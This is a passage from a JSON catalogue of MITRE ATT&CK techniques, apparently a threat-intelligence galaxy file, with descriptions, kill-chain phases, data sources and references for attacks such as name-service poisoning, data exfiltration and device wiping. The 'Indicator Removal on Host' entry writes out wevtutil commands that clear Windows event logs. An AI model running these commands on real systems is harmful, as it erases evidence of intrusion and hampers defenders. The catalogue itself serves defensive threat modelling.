          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1439",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-0.html",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-1.html",
          "https://experts.illinois.edu/en/publications/security-concerns-in-android-mhealth-apps"
        ]
      },
      "uuid": "393e8c12-a416-4575-ba90-19cc85656796",
      "value": "Eavesdrop on Insecure Network Communication - T1439"
    },
    {
      "description": "An adversary could distribute malicious software development tools (e.g., compiler) that hide malicious behavior in software built using the tools. (Citation: PA XcodeGhost) (Citation: Reflections on Trusting Trust)",
      "meta": {
        "external_id": "T1394",
        "kill_chain": [
          "mitre-pre-attack:stage-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1394"
        ]
      },
      "uuid": "d2c4206a-a431-4494-834d-52944a79e9f4",
      "value": "Distribute malicious software development tools - T1394"
    },
    {
      "description": "An adversary may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) ",
      "meta": {
        "external_id": "T1537",
        "kill_chain": [
          "mitre-attack:exfiltration"
        ],
        "mitre_data_sources": [
          "Stackdriver logs",
          "Azure activity logs",
          "AWS CloudTrail logs"
        ],
        "mitre_platforms": [
          "Azure",
          "AWS",
          "GCP"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1537",
          "https://www.justice.gov/file/1080281/download"
        ]
      },
      "uuid": "d4bdbdea-eaec-4071-b4f9-5105e12ea4b6",
      "value": "Transfer Data to Cloud Account - T1537"
    },
    {
      "description": "Execution of code and network communications often result in logging or other system or network forensic artifacts. An adversary can run their code to identify what is recorded under different conditions. This may result in changes to their code or adding additional actions (such as deleting a record from a log) to the code. (Citation: EDB-39007) (Citation: infosec-covering-tracks)",
      "meta": {
        "external_id": "T1358",
        "kill_chain": [
          "mitre-pre-attack:test-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1358"
        ]
      },
      "uuid": "a16e4004-caac-4a0b-acd5-486f8fda1665",
      "value": "Review logs and residual traces - T1358"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nMany mobile devices are configured to only allow applications to be installed from the mainstream vendor app stores (e.g., Apple App Store and Google Play Store).  These app stores scan submitted applications for malicious behavior.  However, applications can evade these scans by downloading and executing new code at runtime that was not included in the original application package. (Citation: Fruit vs Zombies) (Citation: Android Hax) (Citation: Execute This!) (Citation: HT Fake News App) (Citation: Anywhere Computing kill 2FA) (Citation: Android Security Review 2015)",
      "meta": {
        "external_id": "T1395",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1395"
        ]
      },
      "uuid": "41086474-e6de-4fac-bb69-640db7fdf3d2",
      "value": "Runtime code download and execution - T1395"
    },
    {
      "description": "An adversary can run their code on systems with cyber security protections, such as antivirus products, in place to see if their code is detected. They can also test their malware on freely available public services. (Citation: MalwareQAZirtest)",
      "meta": {
        "external_id": "T1359",
        "kill_chain": [
          "mitre-pre-attack:test-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1359"
        ]
      },
      "uuid": "8b57a8f1-9cbc-4b95-b162-cc2a1add94f2",
      "value": "Test malware to evade detection - T1359"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nReplacing a legitimate binary with malware can be accomplished either by replacing a binary on a legitimate download site or standing up a fake or alternative site with the malicious binary. The intent is to have a user download and run the malicious binary thereby executing malware. (Citation: FSecureICS)",
      "meta": {
        "external_id": "T1378",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1378"
        ]
      },
      "uuid": "0d759854-9b69-438c-8325-74b03cc80cf0",
      "value": "Replace legitimate binary with malware - T1378"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nExternally facing systems allow connections from outside the network as a normal course of operations.  Externally facing systems may include, but are not limited to, websites, web portals, email, DNS, FTP, VPN concentrators, and boarder routers and firewalls. These systems could be in a demilitarized zone (DMZ) or may be within other parts of the internal environment. (Citation: CylanceOpCleaver) (Citation: DailyTechAntiSec)",
      "meta": {
        "external_id": "T1388",
        "kill_chain": [
          "mitre-pre-attack:compromise"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1388"
        ]
      },
      "uuid": "4aeafdb3-eb0b-4e8e-b93f-95cd499088b4",
      "value": "Compromise of externally facing system - T1388"
    },
    {
      "description": "An attacker could jam radio signals (e.g. Wi-Fi, cellular, GPS) to prevent the mobile device from communicating. (Citation: NIST-SP800187)(Citation: CNET-Celljammer)(Citation: NYTimes-Celljam)(Citation: Digitaltrends-Celljam)(Citation: Arstechnica-Celljam)",
      "meta": {
        "external_id": "GPS-0",
        "kill_chain": [
          "mitre-mobile-attack:network-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1464",
          "https://pages.nist.gov/mobile-threat-catalogue/cellular-threats/CEL-7.html",
          "https://pages.nist.gov/mobile-threat-catalogue/cellular-threats/CEL-8.html",
          "https://pages.nist.gov/mobile-threat-catalogue/lan-pan-threats/LPN-5.html",
          "https://pages.nist.gov/mobile-threat-catalogue/gps-threats/GPS-0.html",
          "http://csrc.nist.gov/publications/drafts/800-187/sp800_187_draft.pdf",
          "https://www.cnet.com/news/man-put-cell-phone-jammer-in-car-to-stop-driver-calls-fcc-says/",
          "https://www.nytimes.com/2007/11/04/technology/04jammer.html",
          "https://www.digitaltrends.com/mobile/florida-teacher-punished-after-signal-jamming-his-students-cell-phones/",
          "https://arstechnica.com/tech-policy/2016/03/man-accused-of-jamming-passengers-cell-phones-on-chicago-subway/"
        ]
      },
      "uuid": "d2e112dc-f6d4-488d-b8df-ecbfb57a0a2d",
      "value": "Jamming or Denial of Service - T1464"
    },
    {
      "description": "An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an enterprise mobility management (EMM) / mobile device management (MDM) server console could use that access to track mobile devices.(Citation: Krebs-Location)",
      "meta": {
        "external_id": "EMM-7",
        "kill_chain": [
          "mitre-mobile-attack:remote-service-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1468",
          "https://pages.nist.gov/mobile-threat-catalogue/ecosystem-threats/ECO-5.html",
          "https://pages.nist.gov/mobile-threat-catalogue/emm-threats/EMM-7.html",
          "https://krebsonsecurity.com/2018/05/tracking-firm-locationsmart-leaked-location-data-for-customers-of-all-major-u-s-mobile-carriers-in-real-time-via-its-web-site/"
        ]
      },
      "uuid": "6f86d346-f092-4abc-80df-8558a90c426a",
      "value": "Remotely Track Device Without Authorization - T1468"
    },
    {
      "description": "An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an EMM console could use that access to wipe enrolled devices (Citation: Honan-Hacking).",
      "meta": {
        "external_id": "EMM-7",
        "kill_chain": [
          "mitre-mobile-attack:remote-service-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1469",
          "https://pages.nist.gov/mobile-threat-catalogue/ecosystem-threats/ECO-5.html",
          "https://pages.nist.gov/mobile-threat-catalogue/emm-threats/EMM-7.html",
          "https://www.wired.com/2012/08/apple-amazon-mat-honan-hacking/"
        ]
      },
      "uuid": "537ea573-8a1c-468c-956b-d16d2ed9d067",
      "value": "Remotely Wipe Data Without Authorization - T1469"
    },
    {
      "description": "An adversary could attempt to install insecure or malicious configuration settings on the mobile device, through means such as phishing emails or text messages either directly containing the configuration settings as an attachment, or containing a web link to the configuration settings. The device user may be tricked into installing the configuration settings through social engineering techniques (Citation: Symantec-iOSProfile).\n\nFor example, an unwanted Certification Authority (CA) certificate could be placed in the device's trusted certificate store, increasing the device's susceptibility to man-in-the-middle network attacks seeking to eavesdrop on or manipulate the device's network communication ([Eavesdrop on Insecure Network Communication](https://attack.mitre.org/techniques/T1439) and [Manipulate Device Communication](https://attack.mitre.org/techniques/T1463)).\n\nOn iOS, malicious Configuration Profiles could contain unwanted Certification Authority (CA) certificates or other insecure settings such as unwanted proxy server or VPN settings to route the device's network traffic through an adversary's system. The device could also potentially be enrolled into a malicious Mobile Device Management (MDM) system (Citation: Talos-MDM).",
      "meta": {
        "external_id": "STA-7",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion",
          "mitre-mobile-attack:initial-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1478",
          "https://pages.nist.gov/mobile-threat-catalogue/stack-threats/STA-7.html",
          "https://www.symantec.com/connect/blogs/malicious-profiles-sleeping-giant-ios-security",
          "https://blog.talosintelligence.com/2018/07/Mobile-Malware-Campaign-uses-Malicious-MDM.html"
        ]
      },
      "uuid": "cde2cb84-455e-410c-8aa9-086f2788bcd2",
      "value": "Install Insecure or Malicious Configuration - T1478"
    },
    {
      "description": "In addition to a target's social media presence may exist a larger digital footprint, such as accounts and credentials on e-commerce sites or usernames and logins for email.  An adversary familiar with a target's username can mine to determine the target's larger digital footprint via publicly available sources. (Citation: DigitalFootprint) (Citation: trendmicro-vtech)",
      "meta": {
        "external_id": "T1275",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1275"
        ]
      },
      "uuid": "b3f36317-3940-4d71-968f-e11ac1bf6a31",
      "value": "Aggregate individual's digital footprint - T1275"
    },
    {
      "description": "The use of algorithms in malware to periodically generate a large number of domain names which function as rendezvous points for malware command and control servers. (Citation: DamballaDGA) (Citation: DambballaDGACyberCriminals)",
      "meta": {
        "external_id": "T1323",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1323"
        ]
      },
      "uuid": "274164c6-4297-42d4-84b5-2369e51013fe",
      "value": "Domain Generation Algorithms (DGA) - T1323"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nA technique used to compromise victims wherein the victims visit a compromised website that redirects their browser to a malicious web site, such as an exploit kit's landing page.  The exploit kit landing page will probe the victim's operating system, web browser, or other software to find an exploitable vulnerability to infect the victim. (Citation: GeorgeDriveBy) (Citation: BellDriveBy)",
      "meta": {
        "external_id": "T1372",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1372"
        ]
      },
      "uuid": "58d0b955-ae3d-424a-a537-2804dab38793",
      "value": "Unconditional client-side exploitation/Injected Website/Driveby - T1372"
    },
    {
      "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
      "meta": {
        "external_id": "T1171",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Windows event logs",
          "Windows Registry",
          "Packet capture",
          "Netflow/Enclave netflow"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1171",
          "https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution",
          "https://technet.microsoft.com/library/cc958811.aspx",
          "https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html",
          "https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html",
          "https://github.com/nomex/nbnspoof",
          "https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response",
          "https://github.com/SpiderLabs/Responder",
          "https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning",
          "https://github.com/Kevin-Robertson/Conveigh"
        ]
      },
      "uuid": "0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
      "value": "LLMNR/NBT-NS Poisoning and Relay - T1171"
    },
    {
      "description": "Google and Apple provide Google Cloud Messaging and Apple Push Notification Service, respectively, services designed to enable efficient communication between third-party mobile app backend servers and the mobile apps running on individual devices. These services maintain an encrypted connection between every mobile device and Google or Apple that cannot easily be inspected and must be allowed to traverse networks as part of normal device operation. These services could be used by adversaries for communication to compromised mobile devices. (Citation: Securelist Mobile Malware 2013) (Citation: DroydSeuss)",
      "meta": {
        "external_id": "T1390",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1390"
        ]
      },
      "uuid": "5436571f-2332-4b51-b7ed-0bc822fe02c2",
      "value": "OS-vendor provided communication channels - T1390"
    },
    {
      "description": "Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "meta": {
        "external_id": "T1095",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Host network interface",
          "Netflow/Enclave netflow",
          "Network intrusion detection system",
          "Network protocol analysis",
          "Packet capture",
          "Process use of network"
        ],
        "mitre_platforms": [
          "Windows",
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1095",
          "http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29",
          "http://support.microsoft.com/KB/170292",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "c21d5a77-d422-4a69-acd7-2c53c1faa34b",
      "value": "Standard Non-Application Layer Protocol - T1095"
    },
    {
      "description": "An adversary could set up unauthorized Wi-Fi access points or compromise existing access points and, if the device connects to them, carry out network-based attacks such as eavesdropping on or modifying network communication(Citation: NIST-SP800153)(Citation: Kaspersky-DarkHotel).",
      "meta": {
        "external_id": "LPN-0",
        "kill_chain": [
          "mitre-mobile-attack:network-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1465",
          "https://pages.nist.gov/mobile-threat-catalogue/lan-pan-threats/LPN-0.html",
          "http://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-153.pdf",
          "https://blog.kaspersky.com/darkhotel-apt/6613/"
        ]
      },
      "uuid": "633baf01-6de4-4963-bb54-ff6c6357bed3",
      "value": "Rogue Wi-Fi Access Points - T1465"
    },
    {
      "description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, [Scripting](https://attack.mitre.org/techniques/T1064), [PowerShell](https://attack.mitre.org/techniques/T1086), or by using utilities present on the system.\n\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia)\n\nAnother example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection.  These payloads may be used with [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.",
      "meta": {
        "external_id": "T1140",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1140",
          "https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/",
          "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/",
          "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
        ]
      },
      "uuid": "3ccef7ae-cb5e-48f6-8302-897105fbf55c",
      "value": "Deobfuscate/Decode Files or Information - T1140"
    },
    {
      "description": "For a computing resource to be accessible to the public, domain names and IP addresses must be registered with an authorized organization. (Citation: Google Domains WHOIS) (Citation: FunAndSun2012) (Citation: Scasny2015)",
      "meta": {
        "external_id": "T1251",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1251"
        ]
      },
      "uuid": "46017368-6e09-412b-a29c-385be201cc03",
      "value": "Obtain domain/IP registration information - T1251"
    },
    {
      "description": "Leadership organizes Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) into three types of categories and creates more if necessary.  An example of a description of key players KIT would be when an adversary assesses the cyber defensive capabilities of a nation-state threat actor. (Citation: Herring1999)",
      "meta": {
        "external_id": "T1228",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1228"
        ]
      },
      "uuid": "a86a21a4-6304-4df3-aa6d-08114c47d48f",
      "value": "Assign KITs/KIQs into categories - T1228"
    },
    {
      "description": "Analysts may receive intelligence requirements from leadership and begin research process to satisfy a requirement.  Part of this process may include delineating between needs and wants and thinking through all the possible aspects associating with satisfying a requirement. (Citation: FBIIntelligencePrimer)",
      "meta": {
        "external_id": "T1235",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1235"
        ]
      },
      "uuid": "7863b7f1-c18a-4aad-a6cf-4aa6d8797531",
      "value": "Receive operator KITs/KIQs tasking - T1235"
    },
    {
      "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
      "meta": {
        "external_id": "T1030",
        "kill_chain": [
          "mitre-attack:exfiltration"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Netflow/Enclave netflow",
          "Process use of network",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1030",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "c3888c54-775d-4b2f-b759-75a2ececcbfd",
      "value": "Data Transfer Size Limits - T1030"
    },
    {
      "description": "Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to Exfiltration.\n\nAdversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
      "meta": {
        "external_id": "T1005",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "GCP",
          "AWS",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1005"
        ]
      },
      "uuid": "3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
      "value": "Data from Local System - T1005"
    },
    {
      "description": "Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)",
      "meta": {
        "external_id": "T1006",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "API monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1006",
          "http://www.codeproject.com/Articles/32169/FDump-Dumping-File-Sectors-Directly-from-Disk-usin",
          "https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1"
        ]
      },
      "uuid": "0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
      "value": "File System Logical Offsets - T1006"
    },
    {
      "description": "Adversaries may delete or alter generated artifacts on a host system, including logs and potentially captured files such as quarantined malware. Locations and format of logs will vary, but typical organic system logs are captured as Windows events or Linux/macOS files such as [Bash History](https://attack.mitre.org/techniques/T1139) and /var/log/* .\n\nActions that interfere with eventing and other notifications that can be used to detect intrusion activity may compromise the integrity of security solutions, causing events to go unreported. They may also make forensic analysis and incident response more difficult due to lack of sufficient data to determine what occurred.\n\n### Clear Windows Event Logs\n\nWindows event logs are a record of a computer's alerts and notifications. Microsoft defines an event as \"any significant occurrence in the system or in a program that requires users to be notified or an entry added to a log.\" There are three system-defined sources of Events: System, Application, and Security.\n \nAdversaries performing actions related to account management, account logon and directory service access, etc. may choose to clear the events in order to hide their activities.\n\nThe event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nLogs may also be cleared through other mechanisms, such as [PowerShell](https://attack.mitre.org/techniques/T1086).",
      "meta": {
        "external_id": "CAPEC-93",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters",
          "API monitoring",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1070",
          "https://capec.mitre.org/data/definitions/93.html",
          "https://docs.microsoft.com/windows-server/administration/windows-commands/wevtutil",
          "https://msdn.microsoft.com/library/system.diagnostics.eventlog.clear.aspx",
          "https://docs.microsoft.com/powershell/module/microsoft.powershell.management/clear-eventlog"
        ]
      },
      "uuid": "799ace7f-e227-4411-baa0-8868704f2a69",
      "value": "Indicator Removal on Host - T1070"
    },
    {
      "description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Scanning](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
      "meta": {
        "external_id": "T1210",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "Windows Error Reporting",
          "Process monitoring",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1210",
          "https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/",
          "https://nvd.nist.gov/vuln/detail/CVE-2017-0176",
          "https://nvd.nist.gov/vuln/detail/CVE-2016-6662",
          "https://nvd.nist.gov/vuln/detail/CVE-2014-7169"
        ]
      },
      "uuid": "9db0cf3a-a3c9-4012-8268-123b9db6fd82",
      "value": "Exploitation of Remote Services - T1210"
    },
    {
      "description": "Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "meta": {
        "external_id": "CAPEC-309",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1016",
          "https://capec.mitre.org/data/definitions/309.html"
        ]
      },
      "uuid": "707399d6-ab3e-4963-9315-d9d3818cd6a0",
      "value": "System Network Configuration Discovery - T1016"
    },
    {
      "description": "Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.",
      "meta": {
        "external_id": "T1071",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Netflow/Enclave netflow",
          "Process use of network",
          "Malware reverse engineering",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1071",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "355be19c-ffc9-46d5-8d50-d6a036c675b6",
      "value": "Standard Application Layer Protocol - T1071"
    },
    {
      "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.",
      "meta": {
        "external_id": "T1091",
        "kill_chain": [
          "mitre-attack:lateral-movement",
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Data loss prevention"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1091"
        ]
      },
      "uuid": "3b744087-9945-4a6f-91e8-9dbceda417a4",
      "value": "Replication Through Removable Media - T1091"
    },
    {
      "description": "Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1192). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Spearphishing 